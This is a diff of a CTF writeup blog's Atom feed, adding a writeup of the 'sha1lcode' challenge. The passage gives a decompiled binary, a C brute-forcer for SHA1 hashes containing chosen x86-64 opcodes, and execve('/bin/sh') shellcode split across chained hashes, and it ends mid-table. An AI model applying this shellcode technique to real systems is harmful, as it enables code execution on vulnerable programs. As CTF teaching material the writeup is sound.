@@ -1,5 +1,204 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Krebs CTF Writeups</title><link href="http://krebsco.de/" rel="alternate"></link><link href="http://krebsco.de/atom.xml" rel="self"></link><id>http://krebsco.de/</id><updated>2014-07-30T00:00:00+02:00</updated><entry><title>Be a Robot</title><link href="http://krebsco.de/be-a-robot.html" rel="alternate"></link><updated>2014-07-30T00:00:00+02:00</updated><author><name>makefu</name></author><id>tag:krebsco.de,2014-07-30:be-a-robot.html</id><summary type="html">&lt;ul&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Krebs CTF Writeups</title><link href="http://krebsco.de/" rel="alternate"></link><link href="http://krebsco.de/atom.xml" rel="self"></link><id>http://krebsco.de/</id><updated>2014-08-18T00:00:00+02:00</updated><entry><title>sha1lcode</title><link href="http://krebsco.de/sha1lcode.html" rel="alternate"></link><updated>2014-08-18T00:00:00+02:00</updated><author><name>samuirai</name></author><id>tag:krebsco.de,2014-08-18:sha1lcode.html</id><summary type="html">&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Solved by&lt;/strong&gt;: samuirai&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Writeup Author&lt;/strong&gt;: samuirai&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The name of the challange &lt;code&gt;sha1lcode&lt;/code&gt; already hints on the overall idea - writing shellcode that has something todo with sha1 hashes.&lt;/p&gt;
+&lt;p&gt;So let's have a first look at the provided binary file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;sha1lcode&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;b43cc13b0fb249726e0ae175dbef3fe&lt;/span&gt;
+&lt;span class="n"&gt;sha1lcode&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;b43cc13b0fb249726e0ae175dbef3fe&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;bit&lt;/span&gt; &lt;span class="n"&gt;LSB&lt;/span&gt; &lt;span class="n"&gt;executable&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x86&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SYSV&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;dynamically&lt;/span&gt; &lt;span class="n"&gt;linked&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uses&lt;/span&gt; &lt;span class="n"&gt;shared&lt;/span&gt; &lt;span class="n"&gt;libs&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="mf"&gt;2.6.24&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;stripped&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The following call tree image is generated with &lt;code&gt;Hopper Dissassembler.app&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="sha1lcode calltree" src="data/sha1lcode/sha1_calltree.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Hopper can also generate some pseudo C code, which I have cleaned up a little bit and renamed variables:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;main&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nx"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nx"&gt;input_size&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;input_size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x3e8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="nx"&gt;rax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;input_size&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                        &lt;span class="nx"&gt;anz_chrs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;input_data&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;input_size&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                        &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;anz_chrs&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="p"&gt;}&lt;/span&gt;
+                &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;input_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                         &lt;span class="nx"&gt;SHA1&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;input_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                        &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+                &lt;span class="p"&gt;}&lt;/span&gt;
+                &lt;span class="nx"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;input_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x3e80&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+                &lt;span class="nx"&gt;rax&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At the start of the function you can see a &lt;code&gt;read()&lt;/code&gt; of 4 bytes and a first check afterwards, which would exit the application
+if you enter 4 bytes bigger than 0x3e8.
+If this is check is passed, the entered value &lt;code&gt;input_size&lt;/code&gt; is used in the while loop to &lt;code&gt;read()&lt;/code&gt; more data into &lt;code&gt;input_data&lt;/code&gt;.
+After this loop is completed, &lt;code&gt;input_data&lt;/code&gt; is hashed in 16 byte chunks with &lt;code&gt;SHA1()&lt;/code&gt; and written into &lt;code&gt;code&lt;/code&gt;.
+At the end the original input_data is overwritten with &lt;code&gt;0xffffffff&lt;/code&gt; and the program jumps to the &lt;code&gt;code&lt;/code&gt; data.&lt;/p&gt;
+&lt;p&gt;So the data we input in the loop, gets hashed in 16 byte chunks with SHA1 and then we jump to those hashes.
+Now it's clear what we have to do - we have to generate SHA1 hashes with valid x86-64 opcodes.&lt;/p&gt;
+&lt;p&gt;This is a bit of crappy C code to bruteforce hashes with specific values.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;openssl/sha.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;gen_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;alphanum&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;quot;0123456789&amp;quot;&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;&lt;/span&gt;
+        &lt;span class="s"&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;alphanum&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alphanum&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;max&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// generate max. 32 hashes with the searched values&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;ibuf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;obuf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(;;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="c1"&gt;// get a random string&lt;/span&gt;
+        &lt;span class="n"&gt;gen_random&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ibuf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="c1"&gt;// hash the random string&lt;/span&gt;
+        &lt;span class="n"&gt;SHA1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ibuf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obuf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="cm"&gt;/*&lt;/span&gt;
+&lt;span class="cm"&gt;        check if we got a hash with the opcode(s) we want.&lt;/span&gt;
+&lt;span class="cm"&gt;        if(obuf[17]==0x48 &amp;amp;&amp;amp; obuf[18]==0x09 &amp;amp;&amp;amp; obuf[19]==0xcb ) {&lt;/span&gt;
+&lt;span class="cm"&gt;        if(obuf[18]==0xb1 &amp;amp;&amp;amp; obuf[19]==0x96 ) {&lt;/span&gt;
+&lt;span class="cm"&gt;        if(obuf[0]==0xeb &amp;amp;&amp;amp; obuf[1]==35 ) {&lt;/span&gt;
+&lt;span class="cm"&gt;        */&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;obuf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mh"&gt;0x31&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;obuf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mh"&gt;0xc0&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s sha1(&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ibuf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%02x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obuf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+            &lt;span class="p"&gt;}&lt;/span&gt;
+            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="o"&gt;--&amp;lt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now that we have a little tool to generate hashes with opcodes we have to come up with a general 
+idea to fit the shellcode into the hashes:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="sha1lcode opcodes" src="data/sha1lcode/sha1_opcodes.png" /&gt;&lt;/p&gt;
+&lt;p&gt;The program jumps to the start of the first hash and there will be a jump to the &lt;em&gt;end&lt;/em&gt; of the 2nd hash. At the end of the 2nd
+hash starts the shellcode with the first instruction(s). The beginning of the hash afterwards will be another jump the the end of the hash after that.&lt;/p&gt;
+&lt;p&gt;So generally we have in the beginning of one hash a jump to the end of the next hash, which will contain one or more shellcode opcodes. This way we can execute anything we want...&lt;/p&gt;
+&lt;p&gt;And this is the shellcode I used:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xFF978CD091969DD1&lt;/span&gt;
+&lt;span class="n"&gt;neg&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;
+&lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;
+&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;
+&lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;
+&lt;span class="n"&gt;pop&lt;/span&gt; &lt;span class="n"&gt;rdi&lt;/span&gt;
+&lt;span class="n"&gt;cdq&lt;/span&gt;
+&lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;
+&lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;rdi&lt;/span&gt;
+&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;
+&lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;
+&lt;span class="n"&gt;pop&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x3b&lt;/span&gt;
+&lt;span class="n"&gt;syscall&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The only problem is the length of the opcode. It was fairly fast to bruteforce up to three bytes.
+But I had to get the long string &lt;code&gt;/bin/sh&lt;/code&gt; into the 64bit register and the 10 byte opcode is too
+long to bruteforce.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="n"&gt;BBD19D9691D08C97FF&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xff978cd091969dd1&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So I had to split this up in smaller opcodes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x97&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;bh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;
+&lt;span class="n"&gt;shl&lt;/span&gt;  &lt;span class="n"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;bh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x8c&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xd0&lt;/span&gt;
+&lt;span class="n"&gt;shl&lt;/span&gt;  &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x91&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x96&lt;/span&gt;
+&lt;span class="n"&gt;shl&lt;/span&gt;  &lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xd1&lt;/span&gt;
+&lt;span class="n"&gt;mov&lt;/span&gt;   &lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x9d&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Which is almost perfect, but the &lt;code&gt;shl&lt;/code&gt; in &lt;code&gt;rbx&lt;/code&gt; still need 4 bytes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="n"&gt;C1E310&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;shl&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;But because 3 bytes can be bruteforced easily and the &lt;code&gt;jmp&lt;/code&gt; only needs 2 bytes, we can
+bruteforce 3 bytes at the end of the one hash, and 3 bytes at the beginning fo the next hash to match
+&lt;code&gt;opcode (4 bytes) + jump (2 bytes) = 6 bytes&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;In the end we can split up the shellcode like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="s-Atom"&gt;original&lt;/span&gt; &lt;span class="s-Atom"&gt;text&lt;/span&gt;         &lt;span class="s-Atom"&gt;opcode&lt;/span&gt; &lt;span class="s-Atom"&gt;in&lt;/span&gt; &lt;span class="s-Atom"&gt;the&lt;/span&gt; &lt;span class="s-Atom"&gt;sha1&lt;/span&gt; &lt;span class="s-Atom"&gt;hash&lt;/span&gt;
+&lt;span class="s-Atom"&gt;-----------------:------------------------------------&lt;/span&gt;
